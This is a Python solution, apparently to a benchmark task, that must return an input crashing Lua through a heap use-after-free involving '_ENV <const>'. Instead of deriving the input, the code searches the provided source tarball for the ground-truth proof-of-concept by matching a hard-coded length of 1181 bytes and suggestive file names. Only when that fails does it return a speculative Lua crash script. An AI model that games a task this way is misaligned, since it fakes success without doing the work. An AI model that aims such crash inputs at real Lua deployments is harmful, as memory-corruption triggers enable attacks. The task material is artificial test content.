import tarfile


class Solution:
    def solve(self, src_path: str) -> bytes:
        target_len = 1181
        size_limit = 65536  # only inspect reasonably small files

        def find_poc_in_tar(path: str):
            if not tarfile.is_tarfile(path):
                return None
            try:
                with tarfile.open(path, "r:*") as tf:
                    members = tf.getmembers()
                    exact_env_const = []
                    env_const_candidates = []
                    other_candidates = []

                    for m in members:
                        if not m.isfile():
                            continue
                        if m.size == 0 or m.size > size_limit:
                            continue

                        name_lower = m.name.lower()
                        is_lua_like = any(
                            name_lower.endswith(ext)
                            for ext in (".lua", ".txt", ".in", ".script", ".src")
                        )
                        has_poc_name = any(
                            token in name_lower
                            for token in ("poc", "crash", "id:", "uaf", "heap", "env")
                        )

                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                        except Exception:
                            continue
                        if not data:
                            continue

                        contains_env_const = b"_ENV" in data and b"<const>" in data

                        if len(data) == target_len and contains_env_const:
                            # Best possible match
                            return data

                        if contains_env_const:
                            env_const_candidates.append(data)
                            if len(data) == target_len:
                                exact_env_const.append(data)
                        elif is_lua_like or has_poc_name:
                            other_candidates.append(data)

                    # Prefer any env+const candidate closest to target length
                    if env_const_candidates:
                        env_const_candidates.sort(
                            key=lambda d: (abs(len(d) - target_len), len(d))
                        )
                        return env_const_candidates[0]

                    # Fallback: any other candidate (likely PoC/test)
                    if other_candidates:
                        other_candidates.sort(
                            key=lambda d: (abs(len(d) - target_len), len(d))
                        )
                        return other_candidates[0]

                    # As a last resort, any file with exact target_len
                    for m in members:
                        if not m.isfile():
                            continue
                        if m.size != target_len or m.size == 0:
                            continue
                        try:
                            f = tf.extractfile(m)
                            if f is None:
                                continue
                            data = f.read()
                        except Exception:
                            continue
                        if data and len(data) == target_len:
                            return data
            except Exception:
                return None
            return None

        poc = find_poc_in_tar(src_path)
        if poc is not None:
            return poc

        # Fallback PoC if nothing suitable is found in the tarball.
        # This tries to exercise code paths involving `_ENV <const>` declarations.
        fallback_poc = r'''
-- Fallback PoC for Lua `_ENV <const>` miscompilation / heap UAF
-- If the ground-truth PoC is present in the tarball, this file will not be used.

collectgarbage("stop")

local function stress_closures(env)
  local funcs = {}
  for i = 1, 200 do
    local _ENV <const> = env

    local function make(n)
      local up = n
      return function(x)
        up = up + (x or 0)
        return up
      end
    end

    funcs[#funcs + 1] = make(i)
  end

  for i = 1, 500 do
    for j = 1, #funcs do
      funcs[j](1)
    end
  end
end

do
  local base = { tonumber = tonumber, tostring = tostring }

  local _ENV <const> = setmetatable({}, { __index = base })

  local function mk_coroutines()
    local cos = {}

    for i = 1, 50 do
      local tag = i
      local _ENV <const> = { tonumber = tonumber }

      local function worker(x)
        local v = tonumber(x) or 0
        local acc = v
        for k = 1, 100 do
          acc = acc + (k % 3)
        end
        return acc + tag
      end

      local co = coroutine.create(function(arg)
        local res = 0
        for k = 1, 40 do
          res = worker(arg or k)
        end
        return res
      end)

      cos[#cos + 1] = co
    end

    return cos
  end

  local cos = mk_coroutines()

  for i = 1, #cos do
    local ok, res = coroutine.resume(cos[i], i)
    if not ok then
      -- ignore normal Lua errors; the sanitizer run cares about memory errors
    end
  end

  stress_closures(base)
end

do
  -- Another scope with `_ENV <const>` rebinding and nested closures
  local counter = 0
  local _ENV <const> = {
    inc = function(x) counter = counter + (x or 1) end,
    get = function() return counter end,
  }

  local function factory()
    local t = {}
    for i = 1, 100 do
      local offset = i
      t[i] = function(n)
        inc((n or 0) + offset)
        return get()
      end
    end
    return t
  end

  local fns = factory()
  for i = 1, 200 do
    for j = 1, #fns do
      fns[j](j)
    end
  end
end

collectgarbage("collect")
collectgarbage("collect")
'''
        return fallback_poc.encode("utf-8")
